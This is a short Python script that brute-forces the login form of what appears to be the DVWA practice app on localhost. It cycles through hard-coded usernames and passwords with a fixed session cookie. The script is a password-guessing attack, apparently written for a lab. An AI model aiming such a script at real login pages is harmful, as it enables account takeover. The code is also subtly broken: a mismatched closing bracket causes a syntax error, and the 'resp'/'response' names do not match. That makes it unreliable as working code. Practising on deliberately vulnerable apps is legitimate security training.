import requests
url = "http://127.0.0.1:4280/vulnerabilities/brute/"
usernames = ["user", "admin", "test"]
passwords = ["qwerty", "password", "admin"]
headers = {
    "Cookie": "PHPSESSID=10d584bfb3f4f689704b2621555850ed; security=low"
}
for username in usernames:
    for password in passwords:
        params = {
            "username": username,
            "password": password,
            "Login": "Login",
        }
        try:
            resp = requests.get(
                url=url,
                headers=headers,
                params=params,
            }
            if "Login failed" in response.text:
                print(f"failed {username}:{password} pair")
                continue
            print(f"successfully brute-forced login:pass -- {username}:{password}")
            exit(0)                
        except Exception as e:
            print(f"An error occured: {e}")
print("Brute-force ended.")
